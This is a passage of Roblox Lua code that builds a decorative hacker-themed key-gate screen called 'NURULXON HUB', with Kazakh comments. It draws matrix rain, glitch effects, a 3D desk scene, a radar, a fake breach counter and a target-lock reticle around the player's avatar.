        end)
    end)
end

-- Matrix rain background
local MatrixBg = Instance.new("Frame")
MatrixBg.Size = UDim2.new(1, 0, 1, 0)
MatrixBg.BackgroundTransparency = 1
MatrixBg.ClipsDescendants = true
MatrixBg.ZIndex = 1
MatrixBg.Parent = MainFrame

local glyphs = {"0", "1", "X", "K", "7", "9", "#", "$", "/", ">", "_", "ﾊ", "ﾐ"}
for i = 1, 18 do
    task.spawn(function()
        local col = Instance.new("TextLabel")
        col.Size = UDim2.new(0, 20, 1, 0)
        col.Position = UDim2.new((i - 1) / 18, 0, 0, 0)
        col.BackgroundTransparency = 1
        col.TextColor3 = MATRIX
        col.TextTransparency = 0.8
        col.TextSize = 11
        col.Font = Enum.Font.Code
        col.TextYAlignment = Enum.TextYAlignment.Top
        col.ZIndex = 1
        col.Parent = MatrixBg
        while alive() and MainFrame.Parent do
            local s = ""
            for _ = 1, 20 do s = s .. glyphs[math.random(1, #glyphs)] .. "\n" end
            col.Text = s
            task.wait(math.random(1, 4) * 0.1)
        end
    end)
end

local Header = Instance.new("TextLabel")
Header.Size = UDim2.new(0.6, 0, 0, 30)
Header.Position = UDim2.new(0, 12, 0, 6)
Header.BackgroundTransparency = 1
Header.Text = "NURULXON HUB"
Header.TextColor3 = MAIN
Header.TextSize = 19
Header.Font = Enum.Font.Code
Header.TextXAlignment = Enum.TextXAlignment.Left
Header.ZIndex = 5
Header.Parent = MainFrame

local KeyBadge = Instance.new("TextLabel")
KeyBadge.Size = UDim2.new(0.34, 0, 0, 22)
KeyBadge.Position = UDim2.new(0.64, 0, 0, 10)
KeyBadge.BackgroundTransparency = 1
KeyBadge.Text = "SECURE GATE // v2"
KeyBadge.TextColor3 = ACCENT
KeyBadge.TextSize = 11
KeyBadge.Font = Enum.Font.Code
KeyBadge.TextXAlignment = Enum.TextXAlignment.Right
KeyBadge.ZIndex = 5
KeyBadge.Parent = MainFrame

-- Glitch effect on header
task.spawn(function()
    while alive() do
        task.wait(math.random(15, 40) * 0.1)
        if not alive() then break end
        local oldPos = Header.Position
        for _ = 1, 4 do
            Header.TextColor3 = (math.random() > 0.5) and ACCENT or GREEN
            Header.Position = oldPos + UDim2.new(0, math.random(-3, 3), 0, math.random(-2, 2))
            task.wait(0.05)
        end
        Header.TextColor3 = MAIN
        Header.Position = oldPos
    end
end)

-- ===================== LEFT: 3D HACKER SCENE =====================
local SceneBox = Instance.new("Frame")
SceneBox.Size = UDim2.new(0.55, 0, 0.8, 0)
SceneBox.Position = UDim2.new(0.02, 0, 0.16, 0)
SceneBox.BackgroundColor3 = Color3.fromRGB(2, 2, 2)
SceneBox.BackgroundTransparency = 0.1
SceneBox.BorderSizePixel = 0
SceneBox.ClipsDescendants = true
SceneBox.ZIndex = 3
SceneBox.Parent = MainFrame
Instance.new("UICorner", SceneBox).CornerRadius = UDim.new(0, 8)
local sceneStroke = Instance.new("UIStroke")
sceneStroke.Color = MAIN
sceneStroke.Thickness = 1.6
sceneStroke.Parent = SceneBox

-- ===== CRT сканлайн қабаты (тек детал, түс өзгермейді) =====
local ScanOverlay = Instance.new("Frame")
ScanOverlay.Size = UDim2.new(1, 0, 1, 0)
ScanOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScanOverlay.BackgroundTransparency = 0.78
ScanOverlay.BorderSizePixel = 0
ScanOverlay.ZIndex = 10
ScanOverlay.Parent = SceneBox
local scanSeq = {}
for i = 0, 19 do
    local tpos = i / 19
    local tr = (i % 2 == 0) and 0.55 or 0.92
    table.insert(scanSeq, NumberSequenceKeypoint.new(tpos, tr))
end
local scanGrad = Instance.new("UIGradient")
scanGrad.Transparency = NumberSequence.new(scanSeq)
scanGrad.Rotation = 0
scanGrad.Parent = ScanOverlay
task.spawn(function()
    local off = 0
    while alive() do
        off = (off + 0.012) % 1
        scanGrad.Offset = Vector2.new(0, off)
        task.wait(0.03)
    end
end)

-- ===== кездейсоқ глитч жарқылы (ескі теледидар/CRT әсері) =====
task.spawn(function()
    while alive() do
        task.wait(math.random(50, 110) * 0.1)
        if not alive() then break end
        local oldTr = SceneBox.BackgroundTransparency
        for _ = 1, 3 do
            SceneBox.BackgroundTransparency = math.random(0, 10) / 10
            sceneStroke.Thickness = math.random(10, 30) / 10
            task.wait(0.03)
        end
        SceneBox.BackgroundTransparency = oldTr
        sceneStroke.Thickness = 1.6
    end
end)

local SkinViewport = Instance.new("ViewportFrame")
SkinViewport.Size = UDim2.new(1, 0, 1, 0)
SkinViewport.BackgroundTransparency = 1
SkinViewport.ZIndex = 4
SkinViewport.Ambient = Color3.fromRGB(90, 90, 90)
SkinViewport.LightColor = Color3.fromRGB(255, 255, 255)
SkinViewport.LightDirection = Vector3.new(-1, -1.2, -0.6)
SkinViewport.Parent = SceneBox

local scanWorld = Instance.new("WorldModel")
scanWorld.Parent = SkinViewport
local scanCam = Instance.new("Camera")
scanCam.FieldOfView = 55
scanCam.Parent = SkinViewport
SkinViewport.CurrentCamera = scanCam

-- "HACKING IN PROGRESS" text above the character
local HackText = Instance.new("TextLabel")
HackText.Size = UDim2.new(1, 0, 0, 24)
HackText.Position = UDim2.new(0, 0, 0, 6)
HackText.BackgroundTransparency = 1
HackText.Text = "HACKING IN PROGRESS..."
HackText.TextColor3 = ALERT
HackText.TextStrokeTransparency = 0.3
HackText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
HackText.TextSize = 16
HackText.Font = Enum.Font.Code
HackText.ZIndex = 7
HackText.Parent = SceneBox

local HackSub = Instance.new("TextLabel")
HackSub.Size = UDim2.new(1, 0, 0, 16)
HackSub.Position = UDim2.new(0, 0, 0, 30)
HackSub.BackgroundTransparency = 1
HackSub.Text = "[ BREACH 0% ]"
HackSub.TextColor3 = GREEN
HackSub.TextSize = 12
HackSub.Font = Enum.Font.Code
HackSub.ZIndex = 7
HackSub.Parent = SceneBox

local breachPct, gateOpen, phaseText, phaseColor = 0, false, "BOOTING SYSTEM...", ALERT

-- Кілт қате/дұрыс терілгенде кейіпкердің артқа бұрылып реакция жасауы
local reactionState, reactionT0 = nil, 0
local reactionBBG, reactionLabel
local function showReactionSign(text, color)
    if reactionBBG and reactionLabel then
        reactionLabel.Text = text
        reactionLabel.TextColor3 = color
        reactionBBG.Enabled = true
    end
end
local function hideReactionSign()
    if reactionBBG then reactionBBG.Enabled = false end
end
-- Дауыс жоқ: тек жазумен ғана (reactionBBG / reactionLabel арқылы) хабарлайды.
local function triggerReaction(kind, currentPoseTime)
    reactionState = kind
    reactionT0 = currentPoseTime or 0
end

task.spawn(function()
    local pct = 0
    while alive() do
        pct = (pct + math.random(1, 4)) % 100
        breachPct = pct
        HackSub.Text = "[ BREACH " .. pct .. "% ]"
        if not gateOpen then
            HackText.Text = phaseText
            HackText.TextColor3 = phaseColor
        end
        HackText.Visible = (math.random() > 0.12)
        task.wait(0.15)
    end
end)

-- Corner brackets (HUD)
local function bracket(ax, ay)
    local px, py = (ax == 0) and 4 or -22, (ay == 0) and 4 or -22
    local h = Instance.new("Frame")
    h.Size = UDim2.new(0, 18, 0, 2)
    h.Position = UDim2.new(ax, px, ay, (ay == 0) and 4 or -4)
    h.BackgroundColor3 = ACCENT
    h.BorderSizePixel = 0
    h.ZIndex = 8
    h.Parent = SceneBox
    local v = Instance.new("Frame")
    v.Size = UDim2.new(0, 2, 0, 18)
    v.Position = UDim2.new(ax, (ax == 0) and 4 or -6, ay, py)
    v.BackgroundColor3 = ACCENT
    v.BorderSizePixel = 0
    v.ZIndex = 8
    v.Parent = SceneBox
end
bracket(0, 0); bracket(1, 0); bracket(0, 1); bracket(1, 1)

local RecLabel = Instance.new("TextLabel")
RecLabel.Size = UDim2.new(0, 60, 0, 14)
RecLabel.Position = UDim2.new(0, 10, 0, 10)
RecLabel.BackgroundTransparency = 1
RecLabel.Text = "● REC"
RecLabel.TextColor3 = ALERT
RecLabel.TextSize = 11
RecLabel.Font = Enum.Font.Code
RecLabel.TextXAlignment = Enum.TextXAlignment.Left
RecLabel.ZIndex = 8
RecLabel.Parent = SceneBox

local InfoLabel = Instance.new("TextLabel")
InfoLabel.Size = UDim2.new(1, -20, 0, 14)
InfoLabel.Position = UDim2.new(0, 10, 1, -20)
InfoLabel.BackgroundTransparency = 1
InfoLabel.Text = "TARGET: MAINFRAME // ENC: AES-256 // NODE 7/9"
InfoLabel.TextColor3 = MAIN
InfoLabel.TextSize = 10
InfoLabel.Font = Enum.Font.Code
InfoLabel.TextXAlignment = Enum.TextXAlignment.Left
InfoLabel.ZIndex = 8
InfoLabel.Parent = SceneBox

task.spawn(function()
    while alive() do
        RecLabel.Visible = not RecLabel.Visible
        task.wait(0.6)
    end
end)

-- ===== Іздеуші зымыран (seeker) lock-on торы, дене рамкасы, радар, прогресс =====
local BodyBox = Instance.new("Frame")
BodyBox.Size = UDim2.new(0, 60, 0, 120)
BodyBox.BackgroundTransparency = 1
BodyBox.Visible = false
BodyBox.ZIndex = 8
BodyBox.Parent = SceneBox
local bbStroke = Instance.new("UIStroke")
bbStroke.Color = ACCENT
bbStroke.Thickness = 1.2
bbStroke.Transparency = 0.35
bbStroke.Parent = BodyBox

local Reticle = Instance.new("Frame")
Reticle.AnchorPoint = Vector2.new(0.5, 0.5)
Reticle.Size = UDim2.new(0, 120, 0, 120)
Reticle.BackgroundTransparency = 1
Reticle.Visible = false
Reticle.ZIndex = 9
Reticle.Parent = SceneBox

local retParts = {}
local function retLine(sx, sy, ox, oy, w, h)
    local f = Instance.new("Frame")
    f.BackgroundColor3 = ACCENT
    f.BorderSizePixel = 0
    f.ZIndex = 9
    f.Size = UDim2.new(0, w, 0, h)
    f.Position = UDim2.new(sx, ox, sy, oy)
    f.Parent = Reticle
    table.insert(retParts, f)
end
for cx = 0, 1 do
    for cy = 0, 1 do
        retLine(cx, cy, cx == 0 and 0 or -16, cy == 0 and 0 or -2, 16, 2)
        retLine(cx, cy, cx == 0 and 0 or -2, cy == 0 and 0 or -16, 2, 16)
    end
end
retLine(0.5, 0.5, -6, 0, 12, 1)
retLine(0.5, 0.5, 0, -6, 1, 12)

local RetRing = Instance.new("Frame")
RetRing.AnchorPoint = Vector2.new(0.5, 0.5)
RetRing.Position = UDim2.new(0.5, 0, 0.5, 0)
RetRing.Size = UDim2.new(0.62, 0, 0.62, 0)
RetRing.BackgroundTransparency = 1
RetRing.ZIndex = 9
RetRing.Parent = Reticle
Instance.new("UICorner", RetRing).CornerRadius = UDim.new(1, 0)
local ringStroke = Instance.new("UIStroke")
ringStroke.Color = ACCENT
ringStroke.Thickness = 1.2
ringStroke.Parent = RetRing

local LockLabel = Instance.new("TextLabel")
LockLabel.AnchorPoint = Vector2.new(0.5, 0)
LockLabel.Size = UDim2.new(0, 160, 0, 14)
LockLabel.BackgroundTransparency = 1
LockLabel.Text = ""
LockLabel.TextColor3 = ACCENT
LockLabel.TextSize = 11
LockLabel.Font = Enum.Font.Code
LockLabel.Visible = false
LockLabel.ZIndex = 9
LockLabel.Parent = SceneBox

-- Radar
local Radar = Instance.new("Frame")
Radar.Size = UDim2.new(0, 46, 0, 46)
Radar.Position = UDim2.new(1, -56, 0, 8)
Radar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
Radar.BackgroundTransparency = 0.3
Radar.BorderSizePixel = 0
Radar.ZIndex = 8
Radar.Parent = SceneBox
Instance.new("UICorner", Radar).CornerRadius = UDim.new(1, 0)
local radarStroke = Instance.new("UIStroke")
radarStroke.Color = MAIN
radarStroke.Thickness = 1.2
radarStroke.Parent = Radar
local RadarSweep = Instance.new("Frame")
RadarSweep.Size = UDim2.new(1, 0, 1, 0)
RadarSweep.BackgroundTransparency = 1
RadarSweep.ZIndex = 8
RadarSweep.Parent = Radar
local sweepLine = Instance.new("Frame")
sweepLine.Size = UDim2.new(0, 2, 0.5, 0)
sweepLine.Position = UDim2.new(0.5, -1, 0, 0)
sweepLine.BackgroundColor3 = MAIN
sweepLine.BorderSizePixel = 0
sweepLine.ZIndex = 9
sweepLine.Parent = RadarSweep
local blips = {}
for _ = 1, 3 do
    local b = Instance.new("Frame")
    b.Size = UDim2.new(0, 4, 0, 4)
    b.Position = UDim2.new(math.random(20, 80) / 100, 0, math.random(20, 80) / 100, 0)
    b.BackgroundColor3 = ALERT
    b.BorderSizePixel = 0
    b.ZIndex = 9
    b.Parent = Radar
    Instance.new("UICorner", b).CornerRadius = UDim.new(1, 0)
    table.insert(blips, b)
end
task.spawn(function()
    while alive() do
        for _, b in ipairs(blips) do b.Visible = math.random() > 0.4 end
        task.wait(0.5)
    end
end)

-- Breach progress bar
local BreachBg = Instance.new("Frame")
BreachBg.Size = UDim2.new(1, -20, 0, 4)
BreachBg.Position = UDim2.new(0, 10, 1, -34)
BreachBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
BreachBg.BorderSizePixel = 0
BreachBg.ZIndex = 8
BreachBg.Parent = SceneBox
local BreachFill = Instance.new("Frame")
BreachFill.Size = UDim2.new(0, 0, 1, 0)
BreachFill.BackgroundColor3 = ACCENT
BreachFill.BorderSizePixel = 0
BreachFill.ZIndex = 9
BreachFill.Parent = BreachBg

-- Scanner beam
local ScannerBeam = Instance.new("Frame")
ScannerBeam.Size = UDim2.new(1, 0, 0, 2)
ScannerBeam.BackgroundColor3 = GREEN
ScannerBeam.BorderSizePixel = 0
ScannerBeam.ZIndex = 8
ScannerBeam.Parent = SceneBox

local ScannerGlow = Instance.new("Frame")
ScannerGlow.Size = UDim2.new(1, 0, 0, 24)
ScannerGlow.Position = UDim2.new(0, 0, 0, -11)
ScannerGlow.BackgroundColor3 = MAIN
ScannerGlow.BackgroundTransparency = 0.85
ScannerGlow.BorderSizePixel = 0
ScannerGlow.ZIndex = 7
ScannerGlow.Parent = SceneBox

task.spawn(function()
    local ti = TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
    while alive() do
        local a = TweenService:Create(ScannerBeam, ti, {Position = UDim2.new(0, 0, 1, -2)})
        local b = TweenService:Create(ScannerGlow, ti, {Position = UDim2.new(0, 0, 1, -12)})
        a:Play(); b:Play(); a.Completed:Wait()
        local c = TweenService:Create(ScannerBeam, ti, {Position = UDim2.new(0, 0, 0, 0)})
        local d = TweenService:Create(ScannerGlow, ti, {Position = UDim2.new(0, 0, 0, -11)})
        c:Play(); d:Play(); c.Completed:Wait()
    end
end)

-- Build scene: floor, chair, desk, laptop + avatar
local assembling, assemble = false, {}
local function mkPart(size, cf, color, material, transparency)
    local p = Instance.new("Part")
    p.Size = size
    p.CFrame = cf
    p.Color = color
    p.Material = material or Enum.Material.SmoothPlastic
    p.Transparency = transparency or 0
    p.Anchored = true
    p.CanCollide = false
    p.CastShadow = false
    p.Parent = scanWorld
    if assembling then
        -- бөлшектер ауадан ұшып келіп жиналады
        local idx = #assemble + 1
        local startCF = cf * CFrame.new(math.random(-50, 50) / 10, math.random(30, 70) / 10, math.random(-30, 30) / 10)
            * CFrame.Angles(math.rad(math.random(-180, 180)), math.rad(math.random(-180, 180)), 0)
        table.insert(assemble, {p, cf, p.Transparency, startCF, 0.15 + idx * 0.045})
        p.Transparency = 1
        p.CFrame = startCF
    end
    return p
end

local DARK = Color3.fromRGB(16, 16, 16)
local codeBars = {}
local glowBits, particles, holoRings = {}, {}, {}

local function buildSet()
    -- floor with neon grid
    mkPart(Vector3.new(16, 0.2, 16), CFrame.new(0, -3.4, 0), Color3.fromRGB(6, 6, 6))
    for i = -3, 3 do
        mkPart(Vector3.new(16, 0.05, 0.06), CFrame.new(0, -3.28, i * 2.2), MAIN, Enum.Material.Neon, 0.35)
        mkPart(Vector3.new(0.06, 0.05, 16), CFrame.new(i * 2.2, -3.28, 0), ACCENT, Enum.Material.Neon, 0.5)
    end
    -- chair
    mkPart(Vector3.new(2.3, 0.3, 2.3), CFrame.new(0, -1.25, -0.1), DARK)
    mkPart(Vector3.new(2.3, 2.4, 0.3), CFrame.new(0, 0.1, 1.1) * CFrame.Angles(math.rad(8), 0, 0), DARK)
    mkPart(Vector3.new(2.3, 0.08, 0.34), CFrame.new(0, 1.3, 1.2) * CFrame.Angles(math.rad(8), 0, 0), ACCENT, Enum.Material.Neon)
    mkPart(Vector3.new(0.35, 1.8, 0.35), CFrame.new(0, -2.2, -0.1), Color3.fromRGB(34, 34, 34))
    mkPart(Vector3.new(2.6, 0.25, 0.4), CFrame.new(0, -3.1, -0.1), Color3.fromRGB(34, 34, 34))
    mkPart(Vector3.new(0.4, 0.25, 2.6), CFrame.new(0, -3.1, -0.1), Color3.fromRGB(34, 34, 34))
    -- desk
    assembling = true
    mkPart(Vector3.new(5, 0.22, 2.4), CFrame.new(0, -0.45, -2.5), Color3.fromRGB(12, 12, 12))
    mkPart(Vector3.new(5, 0.05, 0.08), CFrame.new(0, -0.32, -1.3), MAIN, Enum.Material.Neon)
    mkPart(Vector3.new(0.25, 2.8, 0.25), CFrame.new(-2.3, -1.9, -3.4), DARK)
    mkPart(Vector3.new(0.25, 2.8, 0.25), CFrame.new(2.3, -1.9, -3.4), DARK)
    -- laptop
    mkPart(Vector3.new(2.2, 0.1, 1.5), CFrame.new(0, -0.28, -2.3), Color3.fromRGB(26, 26, 26))
    local screenCF = CFrame.new(0, 0.45, -3.05) * CFrame.Angles(math.rad(-12), 0, 0)
    mkPart(Vector3.new(2.2, 1.4, 0.08), screenCF, Color3.fromRGB(4, 4, 4))
    mkPart(Vector3.new(2.0, 1.2, 0.06), screenCF * CFrame.new(0, 0, 0.04), GREEN, Enum.Material.Neon, 0.55)
    -- fake code lines on screen
    for i = 1, 6 do
        local w = math.random(8, 18) / 10
        local bar = mkPart(Vector3.new(w, 0.06, 0.03), screenCF * CFrame.new(-1 + w / 2 + 0.1, 0.5 - i * 0.16, 0.085), Color3.fromRGB(30, 30, 30), Enum.Material.Neon, 0)
        table.insert(codeBars, bar)
    end
    assembling = false
    -- back wall + city skyline with blinking windows
    mkPart(Vector3.new(18, 8, 0.2), CFrame.new(0, 0.6, -6.6), Color3.fromRGB(2, 2, 2))
    mkPart(Vector3.new(18, 0.08, 0.1), CFrame.new(0, 4.5, -6.45), ACCENT, Enum.Material.Neon, 0.2)
    local winColors = {MAIN, ACCENT, Color3.fromRGB(200, 200, 200)}
    for i = -4, 4 do
        local h = math.random(15, 45) / 10
        mkPart(Vector3.new(1.7, h, 0.1), CFrame.new(i * 2, -3.3 + h / 2, -6.4), Color3.fromRGB(10, 10, 10))
        for w = 1, 5 do
            local wy = -3.3 + math.random(3, math.max(4, math.floor(h * 10) - 2)) / 10
            local wc = winColors[math.random(1, 3)]
            local win = mkPart(Vector3.new(0.22, 0.16, 0.05), CFrame.new(i * 2 + (math.random(-6, 6) / 10), wy, -6.32), wc, Enum.Material.Neon, 0.1)
            table.insert(glowBits, {win, wc, Color3.fromRGB(10, 10, 10)})
        end
    end
    assembling = true
    -- side monitors
    for _, side in ipairs({-1, 1}) do
        local mcf = CFrame.new(side * 3.1, 0.9, -3.9) * CFrame.Angles(0, side * math.rad(-28), 0)
        mkPart(Vector3.new(2, 1.3, 0.08), mcf, Color3.fromRGB(4, 4, 4))
        mkPart(Vector3.new(1.8, 1.1, 0.05), mcf * CFrame.new(0, 0, 0.05), (side == -1) and MAIN or ACCENT, Enum.Material.Neon, 0.65)
        mkPart(Vector3.new(0.12, 0.8, 0.12), CFrame.new(side * 3.1, -0.1, -3.95), DARK)
        for i = 1, 5 do
            local w = math.random(6, 14) / 10
            local c = (side == -1) and MAIN or ACCENT
            local bar = mkPart(Vector3.new(w, 0.06, 0.03), mcf * CFrame.new(-0.8 + w / 2, 0.4 - i * 0.16, 0.09), c, Enum.Material.Neon, 0)
            table.insert(glowBits, {bar, c, Color3.fromRGB(10, 10, 10)})
        end
    end
    -- keyboard glow, mug, hologram rings
    mkPart(Vector3.new(1.9, 0.03, 0.55), CFrame.new(0, -0.21, -1.95), ACCENT, Enum.Material.Neon, 0.35)
    mkPart(Vector3.new(0.35, 0.4, 0.35), CFrame.new(1.8, -0.15, -2), Color3.fromRGB(24, 24, 24))
    assembling = false
    for i = 1, 2 do
        local ring = mkPart(Vector3.new(0.06, 2 + i * 0.5, 2 + i * 0.5), CFrame.new(0, 2.4, -2.5), (i == 1) and MAIN or ACCENT, Enum.Material.Neon, 0.55)
        ring.Shape = Enum.PartType.Cylinder
        ring.Transparency = 1
        table.insert(holoRings, {ring, i})
    end
    -- floating data particles
    for _ = 1, 22 do
        local c = (math.random() > 0.5) and MAIN or GREEN
        local pt = mkPart(Vector3.new(0.08, 0.08, 0.08), CFrame.new(math.random(-60, 60) / 10, math.random(-30, 50) / 10, math.random(-50, 30) / 10), c, Enum.Material.Neon, 0.2)
        table.insert(particles, {pt, math.random(4, 12) / 10})
    end
    -- screen glow light
    local light = Instance.new("PointLight")
    light.Color = GREEN
    light.Range = 9
    light.Brightness = 2
    light.Parent = scanWorld:FindFirstChildWhichIsA("BasePart")
end

-- Камера мен сахна аватарға тәуелсіз іске қосылады
local buildOk, buildErr = pcall(buildSet)
if not buildOk then warn("[CyberGate] buildSet error: " .. tostring(buildErr)) end

local poseTime = 0
local avatarPoseFn = nil
local trackHead, trackRoot, introClock = nil, nil, 0
local assembleEnd = 0.15 + #assemble * 0.045 + 0.9
local assembleFinal = false

local function ease01(x)
    x = math.clamp(x, 0, 1)
    return x * x * (3 - 2 * x)
end

local function projectToScene(pos)
    local rel = scanCam.CFrame:PointToObjectSpace(pos)
    if rel.Z >= -0.1 then return nil end
    local size = SkinViewport.AbsoluteSize
    if size.Y <= 0 then return nil end
    local halfH = math.tan(math.rad(scanCam.FieldOfView) / 2) * (-rel.Z)
    local nx = rel.X / (halfH * (size.X / size.Y))
    local ny = rel.Y / halfH
    return Vector2.new((nx * 0.5 + 0.5) * size.X, (0.5 - ny * 0.5) * size.Y)
end

local function extraUpdate(t, dt)
    -- ноутбук/үстел/мониторлар жиналуы
    if not assembleFinal then
        for _, a in ipairs(assemble) do
            local k = ease01((t - a[5]) / 0.7)
            a[1].CFrame = a[4]:Lerp(a[2], k)
            a[1].Transparency = a[3] + (1 - a[3]) * (1 - k)
        end
        if t > assembleEnd then assembleFinal = true end
    end
    BreachFill.Size = UDim2.new(breachPct / 100, 0, 1, 0)
    RadarSweep.Rotation = (t * 180) % 360

    -- seeker lock-on
    local tt = introClock
    local function hideAll()
        Reticle.Visible = false
        BodyBox.Visible = false
        LockLabel.Visible = false
    end
    if not trackHead or not trackHead.Parent or tt < 0.9 then return hideAll() end
    local hp = projectToScene(trackHead.Position)
    local top = projectToScene(trackHead.Position + Vector3.new(0, 1.0, 0))
    local bot = projectToScene(trackHead.Position - Vector3.new(0, 4.4, 0))
    if not (hp and top and bot) then return hideAll() end

    local lockT = ease01((tt - 5.4) / 1.2)
    local locked = lockT >= 1
    local S = 130 - 74 * lockT
    local col = locked and ALERT or ACCENT
    if locked and (math.floor(t * 4) % 2 == 0) then col = Color3.fromRGB(110, 110, 110) end

    Reticle.Visible = true
    Reticle.Size = UDim2.new(0, S, 0, S)
    Reticle.Position = UDim2.new(0, hp.X, 0, hp.Y)
    Reticle.Rotation = (1 - lockT) * ((tt * 140) % 360)
    for _, f in ipairs(retParts) do f.BackgroundColor3 = col end
    ringStroke.Color = col
    bbStroke.Color = col

    local h = bot.Y - top.Y
    if h > 10 then
        local w = h * 0.5
        BodyBox.Visible = true
        BodyBox.Size = UDim2.new(0, w, 0, h)
        BodyBox.Position = UDim2.new(0, hp.X - w / 2, 0, top.Y)
    else
        BodyBox.Visible = false
    end

    LockLabel.Visible = true
    LockLabel.TextColor3 = col
    LockLabel.Position = UDim2.new(0, hp.X, 0, hp.Y + S / 2 + 4)
    if locked then
        LockLabel.Text = (math.floor(t * 3) % 2 == 0) and "◉ TARGET LOCKED" or "○ TARGET LOCKED"
    elseif tt > 5.2 then
        LockLabel.Text = "ACQUIRING " .. math.floor(lockT * 100) .. "%"
    else
        LockLabel.Text = "TRACKING..."
    end
end

local camConn
camConn = RunService.RenderStepped:Connect(function(dt)
    if not alive() then
        camConn:Disconnect()
        return
    end
    poseTime = poseTime + dt
    local a = math.sin(poseTime * 0.5) * 0.25
    local camPos = Vector3.new(3.6 + math.sin(a) * 2, 2.6, 7 + math.cos(a))
    scanCam.CFrame = CFrame.lookAt(camPos, Vector3.new(0, 0.2, -1.6))
    for _, bar in ipairs(codeBars) do
        if math.random() > 0.9 then
            bar.Color = (math.random() > 0.5) and Color3.fromRGB(30, 30, 30) or Color3.fromRGB(180, 180, 180)
        end
    end
    for _, g in ipairs(glowBits) do
        if math.random() > 0.97 then
            g[1].Color = (g[1].Color == g[2]) and g[3] or g[2]
        end
    end
    for _, r in ipairs(holoRings) do
        r[1].Transparency = 0.55 + 0.45 * (1 - ease01((poseTime - 2.4) / 0.6))
        r[1].CFrame = CFrame.new(0, 2.4 + math.sin(poseTime * 2) * 0.08, -2.5) * CFrame.Angles(0, poseTime * (1 + r[2] * 0.6) * ((r[2] == 1) and 1 or -1), 0) * CFrame.Angles(0, 0, math.rad(90))
    end
    for _, pr in ipairs(particles) do
        local pos = pr[1].Position + Vector3.new(0, pr[2] * dt, 0)
        if pos.Y > 5 then pos = Vector3.new(pos.X, -3, pos.Z) end
        pr[1].Position = pos
    end
    if avatarPoseFn then
        local ok, err = pcall(avatarPoseFn, poseTime)
        if not ok then
            warn("[CyberGate] pose error: " .. tostring(err))
            avatarPoseFn = nil
        end
    end
    local ok2, err2 = pcall(extraUpdate, poseTime, dt)
    if not ok2 then warn("[CyberGate] ui error: " .. tostring(err2)) end
end)

task.spawn(function()
    -- Кейбір ойындарда/серверлерде Roblox-тың аватар қызметі бірінші талпыныста
    -- жауап бермей қалуы мүмкін (желі кідірісі, уақытша қате). Сондықтан бірнеше
    -- рет қайталап көреміз, бірден сәтсіз болса да скрипт толық тоқтап қалмайды.
    local dummy = nil
    local usedFallback = false
    for attempt = 1, 6 do
        local okCreate, result = pcall(function()
            return Players:CreateHumanoidModelFromUserId(MY_ROBLOX_USER_ID)
        end)
        if okCreate and result and result:FindFirstChild("HumanoidRootPart") and result:FindFirstChild("Head") then
            dummy = result
            break
        end
        if result and typeof(result) == "Instance" and result:IsA("Model") then
            pcall(function() result:Destroy() end)
        end
        task.wait(1.2 + attempt * 0.3) -- баяу желіде де уақыт береміз
    end
    if not dummy then
        -- Кейбір ойындарда/серверлерде нақты скин еш талпыныста келмей қалуы мүмкін
        -- (аватар қызметі уақытша бұғатталған, т.б.). Сахна бос қалмас үшін
        -- бейтарап стандартты R15 денесін жасаймыз — анимация бәрібір жұмыс істейді.
        local okFallback, fallback = pcall(function()
            return Players:CreateHumanoidModelFromDescription(Instance.new("HumanoidDescription"), Enum.HumanoidRigType.R15)
        end)
        if okFallback and fallback and fallback:FindFirstChild("HumanoidRootPart") then
            dummy = fallback
            usedFallback = true
            warn("[CyberGate] нақты скин жүктелмеді, стандартты денеге ауыстырылды")
        else
            warn("[CyberGate] аватар 6 талпыныстан кейін де, тіпті қор денесімен де жүктелмеді")
            return
        end
    end
    local ok, err = pcall(function()
        dummy.Parent = scanWorld

        local root = dummy:FindFirstChild("HumanoidRootPart")
        if not root then error("HumanoidRootPart жоқ") end

        -- Барлық бөлшекті бекітеміз, физика қатыспайды
        for _, d in ipairs(dummy:GetDescendants()) do
            if d:IsA("BasePart") then
                d.Anchored = true
                d.CanCollide = false
            end
        end

        -- Буындар графы (Motor6D + Weld)
        local adj = {}
        for _, j in ipairs(dummy:GetDescendants()) do
            if (j:IsA("Motor6D") or j:IsA("Weld")) and j.Part0 and j.Part1 then
                adj[j.Part0] = adj[j.Part0] or {}
                adj[j.Part1] = adj[j.Part1] or {}
                table.insert(adj[j.Part0], j)
                table.insert(adj[j.Part1], j)
            end
        end

        local poses = {}
        local function solve(part, visited)
            visited[part] = true
            for _, j in ipairs(adj[part] or {}) do
                local tr = (j:IsA("Motor6D") and poses[j.Name]) or CFrame.new()
                local other, cf
                if j.Part0 == part then
                    other = j.Part1
                    cf = part.CFrame * j.C0 * tr * j.C1:Inverse()
                else
                    other = j.Part0
                    cf = part.CFrame * j.C1 * tr:Inverse() * j.C0:Inverse()
                end
                if other and other:IsA("BasePart") and not visited[other] then
                    other.CFrame = cf
                    solve(other, visited)
                end
            end
        end

        trackHead = dummy:FindFirstChild("Head")
        trackRoot = root

        if trackHead then
            reactionBBG = Instance.new("BillboardGui")
            reactionBBG.Size = UDim2.new(0, 240, 0, 54)
            reactionBBG.StudsOffset = Vector3.new(0, 1.9, 0)
            reactionBBG.AlwaysOnTop = true
            reactionBBG.Enabled = false
            reactionBBG.Parent = trackHead
            local signBg = Instance.new("Frame")
            signBg.Size = UDim2.new(1, 0, 1, 0)
            signBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            signBg.BackgroundTransparency = 0.15
            signBg.BorderSizePixel = 0
            signBg.Parent = reactionBBG
            Instance.new("UICorner", signBg).CornerRadius = UDim.new(0, 6)
            local signStroke = Instance.new("UIStroke")
            signStroke.Thickness = 1.4
            signStroke.Color = Color3.fromRGB(255, 255, 255)
            signStroke.Parent = signBg
            reactionLabel = Instance.new("TextLabel")
            reactionLabel.Size = UDim2.new(1, -10, 1, -6)
            reactionLabel.Position = UDim2.new(0, 5, 0, 3)
            reactionLabel.BackgroundTransparency = 1
            reactionLabel.Font = Enum.Font.Code
            reactionLabel.TextSize = 13
            reactionLabel.TextWrapped = true
            reactionLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            reactionLabel.Text = ""
            reactionLabel.Parent = signBg
        end

        -- Дұрыс кілт кезінде қолына ұстайтын голографиялық консоль
        local consolePanel = Instance.new("Part")
        consolePanel.Size = Vector3.new(1.1, 0.7, 0.08)
        consolePanel.Anchored = true
